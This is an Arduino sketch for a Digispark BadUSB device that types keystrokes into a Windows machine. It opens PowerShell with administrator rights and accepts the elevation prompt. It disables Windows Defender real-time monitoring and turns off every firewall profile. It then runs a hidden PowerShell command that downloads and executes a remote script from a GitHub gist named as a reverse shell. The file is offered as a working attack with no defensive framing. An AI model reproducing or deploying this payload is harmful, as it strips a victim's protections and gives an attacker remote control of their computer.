#include "DigiKeyboard.h"
#include "DigiKeyboardPtBr.h"

void setup() {

}

void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.print("powershell");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT );
DigiKeyboard.delay(700);
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboardPtBr.println("Set-MpPreference -DisableRealtimeMonitoring $true");
DigiKeyboard.delay(200);
DigiKeyboardPtBr.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
DigiKeyboard.delay(200);
DigiKeyboardPtBr.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/Gaaskenz/4eee445e8b709170ba4cf5243e6e246b/raw/fca06a1bcc3f9864b72c8276b4c0c921e5060798/INICIAL_REVERSE')\"");
DigiKeyboard.delay(1000);
DigiKeyboard.delay(1000);

}
